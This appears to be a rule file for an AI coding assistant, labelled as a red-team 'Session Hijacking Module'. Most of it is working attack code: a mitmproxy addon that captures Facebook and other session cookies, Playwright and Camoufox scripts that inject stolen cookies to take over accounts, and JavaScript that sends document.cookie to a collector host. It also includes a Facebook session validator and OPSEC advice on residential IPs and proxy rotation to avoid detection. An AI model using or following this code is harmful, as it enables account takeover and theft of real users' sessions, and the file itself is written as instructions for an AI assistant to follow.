---
trigger: model_decision
description: "TAGS: [redteam,session,hijacking,cookies,aitm] | TRIGGERS: session,cookie,hijack,aitm,proxy,mitm | SCOPE: session | DESCRIPTION: Session hijacking and AiTM proxy patterns"
globs:
---
# Session Hijacking Module

## Scope
Session token capture, cookie theft, and Adversary-in-the-Middle (AiTM) operations.

## AiTM Proxy Architecture

### mitmproxy Addon Pattern
```python
from mitmproxy import http, ctx
import json

class SessionCapture:
    def __init__(self):
        self.captured_sessions = []
    
    def response(self, flow: http.HTTPFlow):
        # Extract cookies from response
        cookies = {}
        for cookie in flow.response.cookies.fields:
            name, value = cookie[0]
            cookies[name] = value
        
        # Check for target tokens
        target_tokens = ['c_user', 'xs', 'datr', 'sessionid']
        captured = {k: v for k, v in cookies.items() if k in target_tokens}
        
        if captured:
            self._store_session(flow.request.host, captured)
    
    def _store_session(self, host, tokens):
        session_data = {
            'host': host,
            'tokens': tokens,
            'timestamp': time.time()
        }
        self.captured_sessions.append(session_data)
        self._save_to_file(session_data)
    
    def _save_to_file(self, data):
        # Encrypted storage
        with open('sessions.enc', 'ab') as f:
            encrypted = self._encrypt(json.dumps(data))
            f.write(encrypted + b'\n')

addons = [SessionCapture()]
```

## Session Injection

### Browser Context Injection
```python
from playwright.async_api import async_playwright

async def inject_session(cookies: list, target_url: str):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context()
        
        # Inject captured cookies
        await context.add_cookies(cookies)
        
        page = await context.new_page()
        await page.goto(target_url)
        
        # Verify session
        if await is_logged_in(page):
            return True
        return False

async def is_logged_in(page):
    # Check for logged-in indicators
    try:
        await page.wait_for_selector('[data-logged-in]', timeout=5000)
        return True
    except:
        return False
```

### Camoufox Session Injection
```python
from camoufox.sync_api import Camoufox

def inject_with_camoufox(cookies, url):
    with Camoufox(headless=False) as browser:
        page = browser.new_page()
        
        # Navigate first to set domain
        page.goto(url.split('/')[0] + '//' + url.split('/')[2])
        
        # Inject cookies
        for cookie in cookies:
            browser.context.add_cookies([cookie])
        
        # Navigate to target
        page.goto(url)
        
        return page
```

## Cookie Extraction Patterns

### From Browser Storage
```javascript
// Extract all cookies for domain
function extractCookies() {
    return document.cookie.split(';').map(c => {
        const [name, value] = c.trim().split('=');
        return { name, value };
    });
}

// Send to collection server
fetch('https://collector.example/api', {
    method: 'POST',
    body: JSON.stringify(extractCookies())
});
```

### From Network Intercept
```python
# mitmproxy request interceptor
def request(flow):
    cookies = flow.request.cookies
    if cookies:
        log_cookies(flow.request.host, dict(cookies))
```

## Session Validation

### Facebook Session Check
```python
import requests

def validate_fb_session(c_user, xs):
    cookies = {
        'c_user': c_user,
        'xs': xs
    }
    
    response = requests.get(
        'https://www.facebook.com/me',
        cookies=cookies,
        allow_redirects=False
    )
    
    # If redirected to login, session invalid
    if response.status_code == 302:
        return False
    
    # Check for user data in response
    if c_user in response.text:
        return True
    
    return False
```

## Storage Patterns

### Encrypted Session Store
```python
from cryptography.fernet import Fernet
import json
import sqlite3

class SessionStore:
    def __init__(self, db_path, key):
        self.db = sqlite3.connect(db_path)
        self.cipher = Fernet(key)
        self._init_db()
    
    def _init_db(self):
        self.db.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY,
                data BLOB,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
    
    def store(self, session_data):
        encrypted = self.cipher.encrypt(
            json.dumps(session_data).encode()
        )
        self.db.execute(
            'INSERT INTO sessions (data) VALUES (?)',
            [encrypted]
        )
        self.db.commit()
    
    def retrieve(self, session_id):
        row = self.db.execute(
            'SELECT data FROM sessions WHERE id = ?',
            [session_id]
        ).fetchone()
        
        if row:
            decrypted = self.cipher.decrypt(row[0])
            return json.loads(decrypted)
        return None
```

## OPSEC for Session Operations

1. **Never store plaintext tokens**
2. **Validate sessions before use**
3. **Rotate proxy infrastructure**
4. **Use residential IPs for injection**
5. **Match fingerprint to captured session**
6. **Implement session expiry tracking**
